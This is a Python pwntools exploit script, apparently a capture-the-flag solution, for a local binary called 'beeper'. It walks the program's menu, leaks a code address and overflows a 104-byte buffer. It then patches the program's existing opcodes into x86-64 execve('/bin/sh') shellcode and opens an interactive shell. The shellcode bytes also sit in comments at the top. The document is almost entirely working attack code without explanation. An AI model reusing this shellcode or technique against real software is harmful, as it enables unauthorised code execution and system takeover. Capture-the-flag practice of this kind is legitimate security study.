#BokuWaDokoNiIruNo?
#free 1,2,0 show 0
#"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05";
#"\x68\x6f\x64\x20\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x75\x79\x20\x61\x20\x70\x68\x6f\x50\x48\xb8\x61\x6e\x20\x6e\x6f\x74\x20\x62\x50\x48\xb8\x65\x72\x2c\x79\x6f\x75\x20\x63\x50\x48\xb8\x42\x61\x64\x20\x68\x61\x63\x6b\x50\x6a\x01\x58\x6a\x01\x5f\x6a\x23\x5a\x48\x89\xe6\x0f\x05\xc9\xc3"
from pwn import *
p=process('./beeper')
p.recv()
p.sendline("BokuWaDokoNiIruNo?")
p.recvuntil('choice>>')
p.sendline('2')
p.recvuntil('remove?')
p.sendline('1')
p.recvuntil('choice>>')
p.sendline('2')
p.recvuntil('remove?')
p.sendline('2')
p.recvuntil('choice>>')
p.sendline('2')
p.recvuntil('remove?')
p.sendline('0')
p.recvuntil('choice>>')
p.sendline('1')
p.recvuntil('number:')
p.sendline('0')
p.recvuntil('phone number:')
codeaddr=u64(p.recv(8))
print hex(codeaddr)
p.sendline('4')
p.recv()
pas="\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf"
padd='\x00'*(104-len(pas))
shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
opcode="\x68\x6f\x64\x20\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x75\x79\x20\x61\x20\x70\x68\x6f\x50\x48\xb8\x61\x6e\x20\x6e\x6f\x74\x20\x62\x50\x48\xb8\x65\x72\x2c\x79\x6f\x75\x20\x63\x50\x48\xb8\x42\x61\x64\x20\x68\x61\x63\x6b\x50\x6a\x01\x58\x6a\x01\x5f\x6a\x23\x5a\x48\x89\xe6\x0f\x05\xc9\xc3"
s=list(shellcode)
o=list(opcode)
pay=""
for i in range(0,len(shellcode)):
	temp = ord(s[i])-ord(o[i])
	if temp > 0:
		pay+='m'*abs(temp)
	else :
		pay+='u'*abs(temp)
	pay+='h'
pay+='\x00'
payload=pas+padd+p64(codeaddr)+pay
p.sendline(payload)
p.sendline('3')
p.interactive()
